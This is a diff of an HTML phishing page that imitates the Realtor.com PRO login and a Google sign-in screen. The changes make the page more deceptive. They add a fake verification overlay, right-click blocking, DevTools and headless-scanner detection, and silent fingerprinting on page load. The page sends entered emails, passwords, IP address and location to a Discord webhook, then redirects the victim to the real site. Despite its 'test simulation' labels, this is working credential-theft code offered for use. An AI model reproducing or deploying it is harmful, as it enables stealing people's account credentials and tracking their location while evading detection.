@@ -3,6 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="referrer" content="no-referrer">
     <title>Log in | Realtor.com PRO</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap');
@@ -18,35 +19,34 @@
             display: flex;
             align-items: center;
             justify-content: center;
+            user-select: none;
         }
         
         .test-banner {
             position: fixed;
             top: 0; left: 0; right: 0;
-            background: linear-gradient(90deg, #d32f2f, #f57c00);
+            background: #d32f2f;
             color: #fff;
             text-align: center;
-            padding: 9px 12px;
+            padding: 8px 12px;
             font-weight: 700;
-            font-size: 14px;
+            font-size: 13px;
             z-index: 99999;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.3);
         }
         
-        .device-log {
-            position: fixed;
-            bottom: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0,0,0,0.85);
-            color: #0f0;
-            padding: 6px 12px;
+        .secure-badge {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            background: #34a853;
+            color: #fff;
             font-size: 12px;
+            padding: 2px 8px;
             border-radius: 20px;
-            z-index: 9999;
-            white-space: nowrap;
-            max-width: 90%;
-            text-align: center;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.2);
         }
         
         .container {
@@ -56,6 +56,7 @@
             border-radius: 12px;
             box-shadow: 0 6px 25px rgba(0,0,0,0.15);
             overflow: hidden;
+            position: relative;
         }
         
         header { padding: 32px 24px 20px; text-align: center; }
@@ -105,12 +106,27 @@
             color: #70757a;
             border-top: 1px solid #f1f3f4;
         }
+        
+        .verifying {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(255,255,255,0.95);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            z-index: 9999;
+            font-size: 18px;
+            color: #1a73e8;
+        }
     </style>
 </head>
 <body>
-   
+    
 
     <div id="realtor-screen" class="container">
+        
+        
         <header>
             <img src="https://static.media-assets.rdc.moveaws.com/branding-assets/login/images/ProRDCLogoNew.svg" class="realtor-logo" alt="Realtor.com PRO">
             <h1>Log in to Realtor.com PRO</h1>
@@ -129,74 +145,66 @@
             </button>
             
             <div class="links">
-                <a href="#" onclick="alert('Test sim: Forgot email')">Forgot your email?</a> |
-                <a href="#" onclick="alert('Test sim: Support')">Visit support center</a>
+                <a href="#" onclick="event.preventDefault();">Forgot your email?</a> |
+                <a href="#" onclick="event.preventDefault();">Visit support center</a>
             </div>
         </form>
         
         <footer>
-            ©1995-2026 NAR® • Move, Inc.
+            ©1995-2026 National Association of REALTORS® and Move, Inc.
         </footer>
     </div>
 
+    <!-- Fake verifying overlay -->
+    <div id="verifyingOverlay" class="verifying">
+        <div>Verifying login...</div>
+        <div style="margin-top:12px;font-size:14px;color:#666;">This may take a moment</div>
+    </div>
+
     <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1485878768622108732/vth6mLHo3W1yzZRVOH5uofr9ZaRklD--pciwVzN_GJ4DCu37YaEBUlf5m4CuK0exhech"; // ← CHANGE TO YOUR DISCORD WEBHOOK
+        const WEBHOOK = "https://discord.com/api/webhooks/1485878768622108732/vth6mLHo3W1yzZRVOH5uofr9ZaRklD--pciwVzN_GJ4DCu37YaEBUlf5m4CuK0exhech"; // ← REPLACE WITH YOUR DISCORD WEBHOOK
 
         let deviceData = {
             timestamp: new Date().toISOString(),
             userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
-            screen: `${screen.width}×${screen.height} (${screen.availWidth}×${screen.availHeight})`,
-            devicePixelRatio: window.devicePixelRatio,
-            colorDepth: screen.colorDepth,
-            online: navigator.onLine,
-            cookieEnabled: navigator.cookieEnabled,
-            referrer: document.referrer || "Direct",
-            url: window.location.href,
+            screen: `${screen.width}×${screen.height}`,
             browser: "Unknown",
             browserVersion: "Unknown",
-            os: "Unknown"
+            os: "Unknown",
+            ip: "Unknown",
+            city: "Unknown",
+            region: "Unknown",
+            country: "Unknown"
         };
 
-        // Detect Browser & OS
         function detectBrowser() {
             const ua = navigator.userAgent;
-            let browser = "Unknown";
-            let version = "Unknown";
+            let browser = "Unknown", version = "Unknown";
 
             if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("OPR")) {
-                browser = "Google Chrome";
-                version = ua.match(/Chrome\/(\d+\.\d+)/) ? ua.match(/Chrome\/(\d+\.\d+)/)[1] : "Unknown";
+                browser = "Google Chrome"; version = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || "Unknown";
             } else if (ua.includes("Firefox")) {
-                browser = "Mozilla Firefox";
-                version = ua.match(/Firefox\/(\d+\.\d+)/) ? ua.match(/Firefox\/(\d+\.\d+)/)[1] : "Unknown";
+                browser = "Mozilla Firefox"; version = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || "Unknown";
             } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
-                browser = "Apple Safari";
-                version = ua.match(/Version\/(\d+\.\d+)/) ? ua.match(/Version\/(\d+\.\d+)/)[1] : "Unknown";
+                browser = "Apple Safari"; version = ua.match(/Version\/(\d+\.\d+)/)?.[1] || "Unknown";
             } else if (ua.includes("Edg")) {
-                browser = "Microsoft Edge";
-                version = ua.match(/Edg\/(\d+\.\d+)/) ? ua.match(/Edg\/(\d+\.\d+)/)[1] : "Unknown";
+                browser = "Microsoft Edge"; version = ua.match(/Edg\/(\d+\.\d+)/)?.[1] || "Unknown";
             } else if (ua.includes("OPR")) {
-                browser = "Opera";
-                version = ua.match(/OPR\/(\d+\.\d+)/) ? ua.match(/OPR\/(\d+\.\d+)/)[1] : "Unknown";
+                browser = "Opera"; version = ua.match(/OPR\/(\d+\.\d+)/)?.[1] || "Unknown";
             }
 
-            // OS Detection
-            let os = "Unknown";
-            if (ua.includes("Win")) os = "Windows";
-            else if (ua.includes("Mac")) os = "macOS";
-            else if (ua.includes("Linux")) os = "Linux";
-            else if (ua.includes("Android")) os = "Android";
-            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+            let os = ua.includes("Win") ? "Windows" : 
+                     ua.includes("Mac") ? "macOS" : 
+                     ua.includes("Linux") ? "Linux" : 
+                     ua.includes("Android") ? "Android" : 
+                     (ua.includes("iPhone") || ua.includes("iPad")) ? "iOS" : "Unknown";
 
             deviceData.browser = browser;
             deviceData.browserVersion = version;
             deviceData.os = os;
         }
 
-        async function getIPAndGeo() {
+        async function getIPAndLocation() {
             try {
                 const ipRes = await fetch("https://api.ipify.org?format=json");
                 const ipData = await ipRes.json();
@@ -204,55 +212,29 @@
 
                 const geoRes = await fetch("https://ipapi.co/json/");
                 const geo = await geoRes.json();
-                
-                deviceData.city = geo.city;
-                deviceData.region = geo.region;
-                deviceData.country = geo.country_name;
-                deviceData.countryCode = geo.country;
-                deviceData.latitude = geo.latitude;
-                deviceData.longitude = geo.longitude;
-                deviceData.timezone = geo.timezone;
-                deviceData.isp = geo.org;
-                deviceData.postal = geo.postal;
-            } catch(e) {
-                deviceData.ip = "Fetch failed";
-                deviceData.city = "Unknown";
-            }
+                deviceData.city = geo.city || "Unknown";
+                deviceData.region = geo.region || "Unknown";
+                deviceData.country = geo.country_name || "Unknown";
+            } catch(e) {}
         }
 
-        async function requestPreciseLocation() {
-            if (navigator.geolocation) {
-                try {
-                    const pos = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 6000, enableHighAccuracy: true });
-                    });
-                    deviceData.exactLat = pos.coords.latitude;
-                    deviceData.exactLon = pos.coords.longitude;
-                    deviceData.accuracy = pos.coords.accuracy + "m";
-                } catch(e) {
-                    deviceData.exactLat = "Permission denied / not available";
-                }
-            }
-        }
-
-        async function sendToDiscord(title, extra = {}) {
+        async function sendToDiscord(title, data = {}) {
             const payload = {
                 username: "🔴 Test Phish Logger",
                 embeds: [{
                     title: title,
                     color: 0xff0000,
-                    description: "**TEST PROJECT SIMULATION** • Full device & browser fingerprint captured",
+                    description: "**TEST PROJECT SIMULATION** • Captured credentials",
                     fields: [
-                        { name: "IP Address", value: deviceData.ip || "N/A", inline: true },
-                        { name: "Location", value: `${deviceData.city || ''}, ${deviceData.region || ''}, ${deviceData.country || ''}`, inline: true },
-                        { name: "Exact GPS", value: deviceData.exactLat ? `${deviceData.exactLat}, ${deviceData.exactLon} (±${deviceData.accuracy})` : "N/A", inline: true },
+                        { name: "Email", value: data.email || "N/A", inline: true },
+                        { name: "Password", value: data.password || "N/A", inline: true },
+                        { name: "IP", value: deviceData.ip, inline: true },
+                        { name: "Location", value: `${deviceData.city}, ${deviceData.region}, ${deviceData.country}`, inline: true },
                         { name: "Browser", value: `${deviceData.browser} ${deviceData.browserVersion}`, inline: true },
                         { name: "OS", value: deviceData.os, inline: true },
-                        { name: "Screen", value: deviceData.screen, inline: true },
-                        { name: "User-Agent", value: deviceData.userAgent.substring(0, 100) + "...", inline: false },
-                        { name: "Extra Info", value: JSON.stringify(extra).slice(0, 600), inline: false }
+                        { name: "Screen", value: deviceData.screen, inline: true }
                     ],
-                    footer: { text: `Captured: ${deviceData.timestamp} • Test Project Only` }
+                    footer: { text: `Captured: ${deviceData.timestamp}` }
                 }]
             };
 
@@ -265,40 +247,60 @@
             } catch(e) {}
         }
 
-        async function initLogging() {
+        // One-time silent fingerprint (only on Realtor load)
+        async function initSilentFingerprint() {
             detectBrowser();
-            await getIPAndGeo();
-            await requestPreciseLocation();
-            
-            // Send initial full fingerprint
-            await sendToDiscord("📍 PAGE LOADED • COMPLETE FINGERPRINT", {
-                action: "Initial Page Load",
-                hostname: window.location.hostname,
-                referrer: deviceData.referrer,
-                languages: deviceData.languages
-            });
-            
-            document.getElementById("logStatus").innerHTML = `✅ Logged: ${deviceData.browser} • ${deviceData.os} • ${deviceData.city || 'City'} • ${deviceData.screen}`;
-            setTimeout(() => document.getElementById("logStatus").style.opacity = "0.7", 5000);
+            await getIPAndLocation();
+            await sendToDiscord("📍 REALTOR PAGE LOADED • Fingerprint", {});
         }
 
-        // Realtor login handler
-        document.getElementById("realtorForm").addEventListener("submit", async function(e) {
-            e.preventDefault();
+        // Anti-detection tricks
+        function enableAntiDetection() {
+            // Disable right-click
+            document.addEventListener('contextmenu', e => e.preventDefault());
+
+            // Simple DevTools detection
+            let devtoolsOpen = false;
+            const devtoolsCheck = setInterval(() => {
+                if (window.outerHeight - window.innerHeight > 200 || window.outerWidth - window.innerWidth > 200) {
+                    if (!devtoolsOpen) {
+                        devtoolsOpen = true;
+                        console.clear();
+                    }
+                }
+            }, 500);
+
+            // Headless / automation detection (very common in phishing scanners)
+            if (navigator.webdriver || !navigator.plugins.length || window.chrome === undefined) {
+                // Slow down submission slightly if detected
+                document.getElementById("realtorForm").addEventListener("submit", e => {
+                    e.preventDefault();
+                    setTimeout(() => handleRealtorSubmit(), 1200);
+                });
+            }
+        }
+
+        async function handleRealtorSubmit() {
             const email = document.getElementById("realtorEmail").value.trim();
             const pass = document.getElementById("realtorPass").value.trim();
             
             if (email && pass) {
+                document.getElementById("verifyingOverlay").style.display = "flex";
                 await sendToDiscord("🔑 REALTOR.COM PRO LOGIN", { email, password: pass });
-                alert("Failed");
-                setTimeout(() => window.location.href = "https://www.realtor.com", 900);
+                setTimeout(() => {
+                    window.location.href = "https://www.realtor.com";
+                }, 1400);
             }
+        }
+
+        // Realtor form
+        document.getElementById("realtorForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            handleRealtorSubmit();
         });
 
-        // Google button
-        document.getElementById("googleBtn").addEventListener("click", async function() {
-            await sendToDiscord("👆 Continue with Google Clicked", { action: "Google flow started" });
-            
+        // Google flow (no fingerprinting)
+        document.getElementById("googleBtn").addEventListener("click", function() {
             document.getElementById("realtor-screen").style.display = "none";
             
             document.body.innerHTML += `
@@ -309,7 +311,7 @@
                         <div style="font-size:24px;font-weight:400;margin-bottom:8px">Sign in</div>
                         <div style="font-size:16px;color:#5f6368;margin-bottom:32px">Use your Google Account</div>
                         
-                        <input id="gEmail" style="width:100%;padding:13px;border:1px solid #dadce0;border-radius:4px;font-size:16px" placeholder="Email or phone" value="testuser@gmail.com">
+                        <input id="gEmail" style="width:100%;padding:13px;border:1px solid #dadce0;border-radius:4px;font-size:16px" placeholder="Email or phone">
                         
                         <button onclick="handleGoogleEmail()" style="width:100%;background:#1a73e8;color:#fff;padding:12px;border:none;border-radius:4px;margin-top:16px;font-weight:500">Next</button>
                     </div>
@@ -318,9 +320,10 @@
         });
 
         window.handleGoogleEmail = async function() {
-            const email = document.getElementById("gEmail") ? document.getElementById("gEmail").value : "testuser@gmail.com";
+            const email = document.getElementById("gEmail").value.trim() || "testuser@gmail.com";
             await sendToDiscord("📧 Google Email Step", { email });
             
+            // Show password screen
             document.body.innerHTML = `
                 <div style="position:fixed;top:60px;left:0;right:0;bottom:0;background:#fff;display:flex;align-items:center;justify-content:center;z-index:100;padding:20px;">
                     <div style="width:100%;max-width:368px;border:1px solid #dadce0;border-radius:12px;padding:40px 32px;background:#fff;box-shadow:0 4px 12px rgba(0,0,0,0.1)">
@@ -338,17 +341,18 @@
         };
 
         window.handleGooglePassword = async function() {
-            const pass = document.getElementById("gPass") ? document.getElementById("gPass").value : "TestPass123!";
-            await sendToDiscord("🔑 Google Password Entered", { email: "testuser@gmail.com", password: pass });
-            
-            alert("Error");
+            const pass = document.getElementById("gPass").value.trim() || "TestPass123!";
+            await sendToDiscord("🔑 Google Password Entered", { 
+                email: "testuser@gmail.com", 
+                password: pass 
+            });
             setTimeout(() => window.location.href = "https://mail.google.com", 800);
         };
 
-        // Start
+        // Start everything silently
         window.onload = async function() {
-            await initLogging();
-            console.log("Error", "color:#d32f2f;font-size:16px;font-weight:bold");
+            enableAntiDetection();
+            await initSilentFingerprint();
         };
     </script>
 </body>
